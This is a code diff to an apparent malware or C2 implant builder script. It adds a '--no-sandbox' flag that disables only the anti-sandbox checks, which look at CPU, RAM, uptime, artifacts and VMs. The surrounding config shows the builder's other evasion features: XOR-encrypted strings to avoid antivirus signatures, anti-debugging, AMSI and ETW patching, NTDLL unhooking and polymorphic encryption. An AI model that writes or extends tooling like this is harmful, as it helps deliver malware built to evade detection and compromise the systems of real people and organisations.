@@ -71,6 +71,7 @@ def generate_config_h(
     rsa_modulus: bytes,
     rsa_exponent: bytes,
     no_evasion: bool = False,
+    no_sandbox: bool = False,
     debug: bool = False,
 ):
     """Generate a config.h with XOR-encrypted strings to avoid static AV signatures."""
@@ -154,7 +155,7 @@ def generate_config_h(
 
 /* ─── Evasion Toggles ─── */
 #define CONFIG_ANTI_DEBUG        {0 if no_evasion else 1}
-#define CONFIG_ANTI_SANDBOX      {0 if no_evasion else 1}
+#define CONFIG_ANTI_SANDBOX      {0 if (no_evasion or no_sandbox) else 1}
 #define CONFIG_PATCH_AMSI        {0 if no_evasion else 1}
 #define CONFIG_PATCH_ETW         {0 if no_evasion else 1}
 #define CONFIG_UNHOOK_NTDLL      {0 if no_evasion else 1}
@@ -200,6 +201,7 @@ def build_agent(
     output_path: Path = None,
     profile_path: Path = None,
     no_evasion: bool = False,
+    no_sandbox: bool = False,
     debug: bool = False,
     no_crypt: bool = False,
 ) -> Path:
@@ -301,6 +303,7 @@ def build_agent(
         rsa_modulus=rsa_modulus,
         rsa_exponent=rsa_exponent,
         no_evasion=no_evasion,
+        no_sandbox=no_sandbox,
         debug=debug,
     )
 
@@ -439,6 +442,9 @@ def parse_args():
     p.add_argument("--output", type=Path, default=None)
     p.add_argument("--no-evasion", action="store_true",
                    help="Disable all evasion (anti-debug, anti-sandbox, AMSI/ETW patches, sleep obf)")
+    p.add_argument("--no-sandbox", action="store_true",
+                   help="Disable anti-sandbox checks only (CPU/RAM/uptime/artifact/VM detection). "
+                        "Keeps anti-debug, AMSI/ETW patches, sleep obf, etc.")
     p.add_argument("--no-crypt", action="store_true",
                    help="Skip polymorphic encryption (output raw agent, useful for debugging)")
     p.add_argument("--debug", action="store_true",
@@ -471,6 +477,7 @@ def main():
             output_path=args.output,
             profile_path=args.profile,
             no_evasion=args.no_evasion,
+            no_sandbox=args.no_sandbox,
             debug=args.debug,
             no_crypt=args.no_crypt,
         )
